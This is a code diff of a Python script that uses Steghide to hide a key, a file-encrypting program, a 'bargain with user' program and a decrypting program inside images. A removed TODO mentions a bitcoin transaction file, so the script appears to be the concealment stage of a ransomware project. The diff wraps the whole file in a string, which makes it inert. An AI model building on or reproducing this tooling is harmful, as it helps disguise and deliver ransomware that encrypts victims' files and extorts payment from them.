@@ -1,7 +1,6 @@
-
-from cryptography.fernet import Fernet
-import os
-import subprocess
+'''#from cryptography.fernet import Fernet
+#import os
+#import subprocess
 
 
 def embed_file(file_to_embed: str, cover_file: str, passphrase: str):
@@ -13,9 +12,11 @@ def embed_file(file_to_embed: str, cover_file: str, passphrase: str):
     :param passphrase: The key used to decrypt and access the "secret" message
         in the image.
     """
-    print()
     steghide_compatible_files: list[str] = ["jpeg", "jpg", "bmp", "wav", "au"]
     steghide_path = 'steghide-0.5.1-win32\steghide\steghide.exe'
+
+    if not os.path.exists(steghide_path):
+        raise FileNotFoundError("You need to have the Steghide folder in the same directory as your .PY/.EXE files.")
 
     # Checks the compatibility of the file type with Steghide
     _, cover_file_type = cover_file.split(".")
@@ -46,8 +47,8 @@ def embed_file(file_to_embed: str, cover_file: str, passphrase: str):
 
         # Prints out what's occurring within the command prompt itself
         output, errors = process.communicate()
-        print(f"\nCommand Prompt Output when embedding {file_to_embed} into {cover_file}:"
-              f"\n\tOutput: {output}\n")
+        print(f"\nCommand Prompt Output when embedding {file_to_embed} into {cover_file}: "
+              f"\tOutput: {output}\n")
         if errors:
             print(f"\tErrors: {errors}\n")
 
@@ -75,17 +76,16 @@ def main():
 
     print("**** .PY/.EXE FILES TO EMBED ****")
     code_to_encrypt: str = input("Input the name of the .PY/.EXE file to be used to ENCRYPT files: ")
-    code_to_decrypt: str = input("Input the name of the .PY/.EXE file to be used to DECRYPT files: ")
-    # TODO: Update this to be bitcoin_transaction.py once that file has a GUI interface
     code_to_bargain_with_user: str = input("Input the name of the .PY/.EXE file to be used to BARGAIN with user: ")
+    code_to_decrypt: str = input("Input the name of the .PY/.EXE file to be used to DECRYPT files: ")
 
     print()
 
     print("**** IMAGES TO BE EMBEDDED ****")
     image_containing_key: str = input("Input the name of the image (.JPG, .BMP, .WAV, .AU) to contain your KEY: ")
     image_containing_encryption_code: str = input("Input the name of the .BMP image to contain your ENCRYPTION code: ")
-    image_containing_decryption_code: str = input("Input the name of the .BMP image to contain your DECRYPTION code: ")
     image_containing_bargain_code: str = input("Input the name of the .BMP image to contain your BARGAIN code: ")
+    image_containing_decryption_code: str = input("Input the name of the .BMP image to contain your DECRYPTION code: ")
     print("NOTE: Remember these images and reformat the image names in .PY files accordingly.")
 
     embed_file("key.txt", image_containing_key, passphrase)
@@ -97,9 +97,10 @@ def main():
         lines = [f"{image_containing_key}\n", f"{image_containing_encryption_code}\n",
                  f"{image_containing_bargain_code}\n", f"{image_containing_decryption_code}\n"]
         file.writelines(lines)
+
     with open("passphrase.txt", "w") as file:
         file.writelines(f"{passphrase}")
 
 
 
-main()
+main()'''
